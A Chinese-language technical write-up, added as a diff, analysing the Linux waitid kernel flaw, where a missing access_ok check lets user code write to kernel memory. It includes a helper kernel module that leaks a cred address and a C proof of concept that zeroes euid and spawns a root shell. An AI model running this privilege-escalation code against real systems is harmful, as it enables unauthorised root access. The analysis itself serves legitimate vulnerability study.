@@ -1,0 +1,230 @@
+# 0x00.一切开始之前
+## waitid 系统调用
+waitid 是 Linux 中的一个系统调用，该系统调用与 `wait` 系统调用相类似，用以获取一个进程的状态改变
+原型如下：
+    int waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options);
+                           /* This is the glibc and POSIX interface; see
+                              NOTES for information on the raw system call. */
+  * `idtype` ：用以指定等待的子进程类型：P_PID（等待特定进程）、P_PGID（等待特定进程组）、P_ALL（等待任意子进程）
+  * `id` ：等待的子进程 pid
+  * `infop`：该结构体用以存储 waitid 获取到的子进程相关信息，可以理解为 waitid 对返回值的补充
+  * `options` ：指定获取的子进程类型（正常终止、因信号暂停...）
+其中 `siginfo_t` 结构体定义如下：
+    #include 
+    union sigval {
+        int sival_int;
+        void *sival_ptr;
+    };
+    typedef struct {
+        int si_signo;
+        int si_code;
+        union sigval si_value;
+        int si_errno;
+        pid_t si_pid;
+        uid_t si_uid;
+        void *si_addr;
+        int si_status;
+        int si_band;
+    } siginfo_t;
+> 更多信息参见[这里](https://www.mkssoftware.com/docs/man5/siginfo_t.5.asp)
+## 漏洞成因
+在 waitid 向 infop 中写入数据时未对其地址进行检查，导致用户可以传入一个内核空间中的地址，从而 **非法向内核空间写入数据**
+## 漏洞影响版本
+Linux v4.13~4.14-rc5。Linux v4.14-rc5 和 Linux v4.14.1已修补，Linux v4.14-rc4未修补
+> 昙花一现的一个漏洞，信息甚少，而且说实话不是很好利用...
+# 0x01.漏洞分析
+## Pre.用户空间与内核空间的数据传递
+通常情况下使用函数 `put_user()` / `get_user()`或是 `copy_from_user()` / `copy_to_user()`
+等在用户空间与内核空间之间复制数据，而完成这样的操作我们需要完成：
+  * 检查地址合法性
+  * 禁用/启用 SMEP 保护
+而 waitid 系统调用需要向用户空间上多次写入数据（siginfo_t），为了避免额外的开销，自内核 4.13 版本起使用
+`unsafe_put_user()` 来向用户空间写入数据，从而避免多次检查/开关保护造成的额外开销
+该宏定义于 `/arch/x86/include/asm/uaccess.h`，其中有段说明如下：
+    /*
+     * The "unsafe" user accesses aren't really "unsafe", but the naming
+     * is a big fat warning: you have to not only do the access_ok()
+     * checking before using them, but you have to surround them with the
+     * user_access_begin/end() pair.
+     */
+    //...
+    #define unsafe_put_user(x, ptr, label)  \
+        __put_user_size((__typeof__(*(ptr)))(x), (ptr), sizeof(*(ptr)), label)
+即正常情况下使用时我们不仅要使用 `access_ok()` 检查用户空间地址 **合法性** ，还需要使用 `user_access_begin()` 与
+`user_access_end()` 以完成 **SMAP 保护的关/开** 工作
+这个宏最后展开为宏 `__put_user_goto`，使用内联汇编赋值，出错则跳转到 label 处
+    /*
+     * Tell gcc we read from memory instead of writing: this is because
+     * we do not write to any memory gcc knows about, so there are no
+     * aliasing issues.
+     */
+    #define __put_user_goto(x, addr, itype, ltype, label)           \
+        asm_volatile_goto("\n"                      \
+            "1: mov"itype" %0,%1\n"             \
+            _ASM_EXTABLE_UA(1b, %l2)                \
+            : : ltype(x), "m" (__m(addr))               \
+            : : label)
+### access_ok：检查地址合法性
+宏 `access_ok()` 用以检查一个 **应当指向用户空间的指针** 是否合法，即其所指向的这块区域是否超出了用户空间的范围，定义如下：
+    /**
+     * access_ok: - Checks if a user space pointer is valid
+     * @type: Type of access: %VERIFY_READ or %VERIFY_WRITE.  Note that
+     *        %VERIFY_WRITE is a superset of %VERIFY_READ - if it is safe
+     *        to write to a block, it is always safe to read from it.
+     * @addr: User space pointer to start of block to check
+     * @size: Size of block to check
+     *
+     * Context: User context only. This function may sleep if pagefaults are
+     *          enabled.
+     *
+     * Checks if a pointer to a block of memory in user space is valid.
+     *
+     * Returns true (nonzero) if the memory block may be valid, false (zero)
+     * if it is definitely invalid.
+     *
+     * Note that, depending on architecture, this function probably just
+     * checks that the pointer is in the user space range - after calling
+     * this function, memory access functions may still return -EFAULT.
+     */
+    #define access_ok(type, addr, size)                 \
+    ({                                  \
+        WARN_ON_IN_IRQ();                       \
+        likely(!__range_not_ok(addr, size, user_addr_max()));       \
+    })
+主要就是验证从 `addr` 到 `addr + size` 这段空间是否属于用户空间，因为使用频率较高所以定义成一个宏
+## 代码分析
+waitid 系统调用的代码很短，位于源码目录 `kernel/exit.c` 中，如下：
+    SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
+            infop, int, options, struct rusage __user *, ru)
+    {
+        struct rusage r;
+        struct waitid_info info = {.status = 0};
+        long err = kernel_waitid(which, upid, &info, options, ru ? &r : NULL);
+        int signo = 0;
+        if (err > 0) {
+            signo = SIGCHLD;
+            err = 0;
+        }
+        if (!err) {
+            if (ru && copy_to_user(ru, &r, sizeof(struct rusage)))
+                return -EFAULT;
+        }
+        if (!infop)
+            return err;
+        user_access_begin();
+        unsafe_put_user(signo, &infop->si_signo, Efault);
+        unsafe_put_user(0, &infop->si_errno, Efault);
+        unsafe_put_user((short)info.cause, &infop->si_code, Efault);
+        unsafe_put_user(info.pid, &infop->si_pid, Efault);
+        unsafe_put_user(info.uid, &infop->si_uid, Efault);
+        unsafe_put_user(info.status, &infop->si_status, Efault);
+        user_access_end();
+        return err;
+    Efault:
+        user_access_end();
+        return -EFAULT;
+    }
+我们可以看到的是，在其使用 `unsafe_put_user()` 之前使用了 `user_access_begin()` 关闭 SMAP
+保护，一系列赋值结束之后又使用 `user_access_end()` 关闭了 SMAP 保护，看起来一切都没有问题，但是在
+**这一系列的操作之前并没有使用 access_ok 宏检测传入的地址的合法性** ，由此
+**若是用户传入一个内核空间的地址，则可以非法向内核空间中写入数据**
+# 0x02.漏洞利用
+观察 waitid 的源代码，我们发现在起始时将局部变量 signo 设为0，后面又调用了 `unsafe_put_user(signo,
+&infop->si_signo, Efault)` ，若我们传入内核空间地址则可以通过这一语句向内核空间内写一个 `0`
+我们不难想到的是： **若是我们能够将当前进程的 cred 结构体中的 euid 更改为 0，我们便能够获得 root 权限**
+## poc
+我们通过如下内核模块向进程提供其 cred 结构体的 euid 成员在内核空间中的地址：
+    /*
+    * arttnba3_module.ko
+    * developed by arttnba3
+    */
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #define DEVICE_NAME "a3device"
+    #define DEVICE_PATH "/dev/a3device"
+    #define CLASS_NAME "a3module"
+    static int major_num;
+    static struct class * module_class = NULL;
+    static struct device * module_device = NULL;
+    static struct file * __file = NULL;
+    struct inode * __inode = NULL;
+    static ssize_t a3_module_read(struct file * __file, char __user * user_buf, size_t size, loff_t * __loff);
+    static struct file_operations a3_module_fo = 
+    {
+        .owner = THIS_MODULE,
+        .read = a3_module_read,
+    };
+    static int __init kernel_module_init(void)
+    {
+        major_num = register_chrdev(0, DEVICE_NAME, &a3_module_fo);
+        module_class = class_create(THIS_MODULE, CLASS_NAME);
+        module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
+        __file = filp_open(DEVICE_PATH, O_RDONLY, 0);
+        __inode = file_inode(__file);
+        __inode->i_mode |= 0666;
+        filp_close(__file, NULL);
+        return 0;
+    }
+    static void __exit kernel_module_exit(void)
+    {
+        device_destroy(module_class, MKDEV(major_num, 0));
+        class_destroy(module_class);
+        unregister_chrdev(major_num, DEVICE_NAME);
+    }
+    static ssize_t a3_module_read(struct file * __file, char __user * user_buf, size_t size, loff_t * __loff)
+    {
+        char buf[0x10];
+        int count;
+        *((long long *)buf) = (long long *) &(current->real_cred->euid);
+        count = copy_to_user(user_buf, buf, 8);
+        return count;
+    }
+    module_init(kernel_module_init);
+    module_exit(kernel_module_exit);
+    MODULE_LICENSE("GPL");
+    MODULE_AUTHOR("arttnba3");
+测试用 POC 如下：
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    int main(void)
+    {
+        int fd = open("/dev/a3device", O_RDONLY);
+        long long ptr[0x10];
+        read(fd, ptr, 8);
+        sleep(1);
+        printf("0x%p", ptr[0]);
+        int pid = fork();
+        if (pid == 0)
+        {
+            sleep(2);
+            exit(-1);
+        }
+        else if (pid > 0)
+        {
+            waitid(P_PID, pid, ptr[0] - 0x10, WNOHANG );
+        }
+        if (getuid() == 0)
+        {
+            puts("done!");
+            system("/bin/sh");
+        }
+        else
+        {
+            puts("failed!");
+        }
+    }
+可以看到，当我们运行 poc 后，其 euid 通过 waitid 的漏洞被更改为 0，之后我们便成功地获得了 root 权限
+## 提权
+虽然我们能够通过 waitid 中的 `unsafe_put_user(0, &infop->si_errno, Efault)`
+这一语句向内核空间内写一个 `0`， **但是我们并不能够直接获得当前进程的 cred 在内核空间中的地址，这也令这个漏洞难以被很好地利用**
